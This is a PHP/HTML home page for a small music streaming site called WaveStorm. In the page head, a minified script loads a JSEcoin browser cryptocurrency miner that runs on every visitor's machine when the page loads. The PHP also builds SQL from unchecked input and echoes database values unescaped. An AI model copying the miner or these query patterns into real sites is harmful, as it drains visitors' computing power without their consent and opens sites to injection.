<?php
require_once 'db.php';
/*
echo '<br/><br/><br/><br/><br/>';
echo '<p style="color:white; margin-left:15px;">';
echo 'sikeresen belépve a '.$_SESSION['userID'].' -as azonosítóval.';
echo '<br/>';
echo 'Name: '.$_SESSION['name'];
echo '<br/>';
echo 'Email: '.$_SESSION['email'];
echo '<br/>';
echo 'ID: '.$_SESSION['userID'];
echo '</p>';*/
if(!isset($_SESSION['userID'])||empty($_SESSION['userID']))
    {
        header("Location: login.php");
    }

    function allArtist()
    {
        if($result=$GLOBALS['db']->query("SELECT Artist FROM Music"))
        {
            
            if($result->num_rows)
            {
                $tabla=$result->fetch_all(MYSQLI_ASSOC);
                foreach ($tabla as $sor) 
                {
                    foreach ($sor as $elem) {
                        echo '<tr><td>'.$elem.'</td></tr>';
                    }
                   
                    
                }
            }
            
            
        }
    }

    function randMusic()
    {

        
        $res=$GLOBALS['db']->query("SELECT Location FROM Music ORDER BY RAND() LIMIT 1");
        $table=$res->fetch_all(MYSQLI_ASSOC);
        foreach ($table as $sor) {
            foreach ($sor as $elem) {
                $randelem=$elem;
            }
        }
        
        return 'src="'.$randelem.'"';
    }


    class Music
    {
        public $id;
        public$title;
        public $artist;
        public $album;
        public $genre;
        public $year;
        public $location;

    }


    class PlayList
    {
        public $list= Array();
        public $actual;
    }

    $allList=array();

    
    
    function search($mit)
    {
        
        $eleje="SELECT DISTINCT $mit FROM Music WHERE $mit LIKE '%";
        $vege="%'";
        $teljes=$eleje.$string.$vege;
        $result=$GLOBALS['db']->query($teljes);
        $table=$result->fetch_all(MYSQLI_ASSOC);
        foreach ($table as $sor) 
        {
            foreach ($sor as $eloado) 
            {
                echo $eloado.'<br/>';
            }
        }
    }

    
    


?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-16">
        <link rel="icon" href="img/rsz_icon45x45.png"/>
        <link href="css/home.css" rel="stylesheet" type="text/css" />
        <!--<link href="css/bootstrap.css" rel="stylesheet" type="text/css" />-->
        <link href="css/audioplayer.css" rel="stylesheet" type="text/css" />
        <script src="jquery-3.3.1.min.js"></script>
        <script src="homescript.js"></script>
        <script src="js/audioplayer.js"></script>
        <script src="js/id3-minimized.js" type="text/javascript"></script>
        <script>
            (function(doc){var addEvent='addEventListener',type='gesturestart',qsa='querySelectorAll',scales=[1,1],meta=qsa in doc?doc[qsa]('meta[name=viewport]'):[];function fix(){meta.content='width=device-width,minimum-scale='+scales[0]+',maximum-scale='+scales[1];doc.removeEventListener(type,fix,true);}if((meta=meta[meta.length-1])&&addEvent in doc){fix();scales=[.25,1.6];doc[addEvent](type,fix,true);}}(document));
            $( function() { $( 'audio' ).audioPlayer(); } );
        </script>
        <script type="text/javascript">
        !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/64072/wavestorm.zapto.org/0/0/",s.parentNode.insertBefore(t,s)}();
        </script>
        

        

    </head>
    <body>
        <!--****FEJLÉC*****-->
        <div class="headline">
            <img class="homeLogo" src="img/homelogo.png"/>
            
            <a class="homeTitle" href="home.php" >WaveStorm</a>
            
        <p id="AccountButton"><?php echo $_SESSION['name'] ?> <img id="downArrow" src="img/down.png" style="width:14px;height:14px;margin-left:6px;"/></p>
        <img id="userImg" src="img/user.png"  />
        
        </div>
        
        

        <!--****BALOLDALI MENÜ*****-->
        <div id="toolBar">
            <div class="menuelemDiv" id="kereses">
                <img class="elemImg" id="searchImg" src="img/search_grey.png"/>
                <input type="text" id="searchInput" required placeholder="Search"/>
            </div>

            <div class="menuelemDiv" >
                <img class="elemImg" id="nowPlayedImg" src="img/now.png"/>
                <input class="menuButton" type="button" id="nowPlayed" value="Now Played"/>
            </div>

            <div class="menuelemDiv" >
                <img class="elemImg" id="discoverImg" src="img/discover.png"/>
                <input class="menuButton" type="button" id="discover" value="Discovering"/>
            </div>

            <div class="menuelemDiv" >
                <img class="elemImg" id="playlistImg" src="img/playlist.png"/>
                <input class="menuButton" type="button" id="playlist" value="Playlists"/>
            </div>

            <div class="menuelemDiv" >
                <img class="elemImg" id="addImg" src="img/add.png"/>
                <input class="menuButton" type="button" id="add" value="New Playlist"/>
            </div>   

            <div class="menuelemDiv" id="addNewPlayListDiv">
                <img class="elemImg" id="plusImg" src="img/plus.png"/>
                <input id="newPlayListInput" type="input" placeholder="Playlist Name"/>
            </div>

        </div> 

        

        <!--KERESÉSI TALÁLATOK-->
        <div  id="searchDiv">
            <!--
                <p class="pt" >Artist: </p>
                <div id="searchArtist"></div>
                <br/>
                <p class="pt">Album: </p>
                <div id="searchAlbum"></div>
                <br/>
                <p class="pt">Track: </p>
                <div id="searchTrack"></div>
                -->
        </div>
            

        <!--****NAGY ID3 TAG-EK*****-->
        <div  id="NowPlayedDiv">
            <img id="cover" src=""/>
            <br/>
            <br/>
            <div class="details" id="title"></div>
            <div class="details" id="artist"></div>  
        </div>

        
        


        <!--****FELFEDEZÉS*****-->
        <div id="discoverDiv"  hidden>
            <div id="num1"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num1");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num2"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num2");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num3"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num3");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num4"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num4");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num5"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num5");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num6"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num6");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num7"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num7");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle" ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num8"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num8");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num9"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num9");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num10"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num10");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <div id="num11"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num11");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num12"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num12");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <!--
            <div id="num13"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num13");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num14"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num14");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num15"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num15");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num16"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num16");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <div id="num17"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num17");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>

            <div id="num18"  class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num18");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <div id="num19" class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num19");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <div id="num20" class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num20");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <div id="num21" class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num21");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <div id="num22" class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num22");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <div id="num23" class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num23");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle" ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>
            <div id="num24" class="zene" style="cursor:pointer;" onclick="loadNew(this)">
                <script>
                    randomMusic("num24");
                </script>
                <img class="randCover" src=""/>
                <div class="randtitle"  ></div>
                <span class="hrefloc" style="display:none" ></span>
                <div class="randartist" ></div>
            </div>-->
        </div>

        <!--*****PLAYLISTS*****-->
        <div  id="playlistsDiv" hidden>
            <div style="padding:15px;position:fixed;"class="pt"><span style="padding-right:150px;">Playlists:</span><span style="padding-right:200px;">Tracks:</span></div>
            <div id="theLists"></div>

            <div id="tracksinlist"><span style="color:grey;opacity:0.65;font-style:italic;">No selected playlist</span></div>
        </div>

        <!--PROFILOM SZERKESZTÉSE-->
        <div id="MyProfile" hidden>
                <p class="pt" style="width:300px;text-align:center;">MY ACCOUNT</p>
                <p class="newTitles">Name: </p>
                <input class="newClass" type="text" id="newName" placeholder="New Name"/>

                <p class="newTitles" >Password: </p>
                <input class="newClass" type="password" id="newPassword1" name="newPassword1" placeholder="New Password"/>
                <p class="newTitles" >Password again: </p>
                <input class="newClass" type="password" name="newPassword2" placeholder="New Password again"/>
                <div id="PassWordMustMatch" style="color:#e858b8;margin:0;padding:0;"hidden>The two password doesn't match.</div>
                <input type="button" id="save" value="Save"/> 

            
        </div>

        <!-- LEGÖRDÜLŐ MENÜSOR-->
        <div id="ProfileMenu" hidden>
            <ul>
                <li> <p class="lip">About us</p></li>
                <li><p class="lip">Legal</p></li>
                <li><p class="lip">Copyright</p></li>
                <hr size=1px>
                <li id="myProfileli" style="cursor:pointer;"><p id="myprofileButton" class="lip">My Profile</p></li>
                <li style="cursor:pointer;" id="logoutli" ><a class="lip" id="logout" >Sign out</a></li>
            </ul>
        </div>

        <!--LISTA KIVÁLASZTÓ-->
        <div id="selectList" hidden>
        
        </div>

        <!--****LENTI ZENELEJÁTSZÓ*****-->
        <div id="bigContainer">

            <span id="smallTags">
                <img id="smallCover" src=""/>
                <div id="smallDetails">
                    <div class="smallDetails" id="smallTitle"></div>
                    <div class="smallDetails" id="smallArtist"></div>
                </div>
            </span>
        
            <div  id="controller">
            <button type="button" id="prevbtn" class="controllButton">
                <img class="ctrlImg" id="previmg" src="img/prev.png"/>
            </button>

            <button type="button" id="playbtn" class="controllButton">
                <img class="ctrlImg" id="playimg" src="img/play.png"/>
            </button>

            <button type="button" id="nextbtn" class="controllButton">
                <img class="ctrlImg" id="nextimg" src="img/next.png"/>
            </button>
            </div>

            
            <div id="playerDiv" >
                <audio id="audio" preload="auto" onended="next()" <?php echo randMusic(); ?> hidden controls>
                </audio>
            </div>

        </div>
			

    </body>
</html>